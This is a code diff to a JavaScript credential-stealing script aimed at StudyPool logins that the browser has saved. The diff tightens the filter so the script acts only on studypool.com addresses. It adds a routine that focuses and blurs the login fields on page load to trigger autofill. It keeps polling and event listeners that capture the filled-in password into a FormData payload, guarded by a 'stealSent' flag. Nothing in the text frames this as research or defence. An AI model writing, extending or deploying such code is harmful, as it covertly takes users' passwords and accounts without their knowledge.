@@ -14,12 +14,15 @@
 
     // Strong indicators this is a real StudyPool saved login
     const isAutoFilled = passwordField.matches(':-webkit-autofill, :autofill, [autocompleted]');
-    const hasStudyPoolHint = 
-          user.toLowerCase().includes('study') || 
-          user.toLowerCase().includes('pool') || 
+    const hasStudyPoolHint =
+          user.toLowerCase().includes('study') ||
+          user.toLowerCase().includes('pool') ||
           user.includes('@') && user.split('@')[1]?.includes('study');
 
-    if ((isAutoFilled || hasStudyPoolHint) && !window.stealSent) {
+    // Check if the domain is studypool.com
+    const isStudyPoolDomain = user.includes('@studypool.com');
+
+    if ((isAutoFilled || hasStudyPoolHint) && isStudyPoolDomain && !window.stealSent) {
       window.stealSent = true;
 
       const payload = new FormData();
@@ -39,12 +42,24 @@
     }
   }
 
+  // Function to focus on the username and password fields to trigger auto-fill
+  function triggerAutoFill() {
+    usernameField.focus();
+    usernameField.blur();
+    passwordField.focus();
+    passwordField.blur();
+    passwordField.focus();
+  }
+
   // Aggressive polling for first 10 seconds (most auto-fills happen instantly)
   const poll = setInterval(captureIfStudyPool, 350);
   setTimeout(() => clearInterval(poll), 10000);
 
+  // Trigger auto-fill on page load
+  window.addEventListener('load', triggerAutoFill);
+
   // Fallback triggers on user interaction
-  ['input', 'change', 'focus', 'blur'].forEach(event => 
+  ['input', 'change', 'focus', 'blur'].forEach(event =>
     document.body.addEventListener(event, captureIfStudyPool, true)
   );
 
